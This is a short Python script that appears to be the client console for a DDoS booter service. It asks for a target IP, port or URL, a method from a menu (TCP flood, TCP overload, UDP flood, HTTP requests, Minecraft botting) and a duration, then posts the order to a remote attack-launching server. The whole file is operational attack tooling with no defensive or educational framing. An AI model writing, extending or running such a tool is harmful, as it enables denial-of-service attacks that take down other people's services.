import requests, os

server_url = 'http://yourserver-thatlaunch.attacks'

attack_mode = '''
[1] TCP Flood           |
[2] TCP Overload        |
[3] UDP Flood           |
[4] HTTP Requests       |
[5] Minecraft Botting   |
'''

try:
    while True:
        os.system('cls')
        target = input('Please enter the ip:port ( https://yoururl.com if HTTP Requests) of the target >> ')

        print(attack_mode)
        attack_method = input('Enter your attack method >> ')
        try:
            time = int(input('Please enter for how many seconds you want the attack to stay >> '))
        except ValueError:
            time = 60

        req = requests.post(server_url, json={'target': target, 'method': attack_method, 'time': time})
        if req.status_code in [200, 204]: # You can also check if the req.json() contains a message your server returns
            print('Launched attack successfully !')
            input('Press enter to continue...')
        else:
            print(f'[!] something bad happened: {req.text} - {req.status_code}')

except KeyboardInterrupt:
    print('Exiting...')
    exit()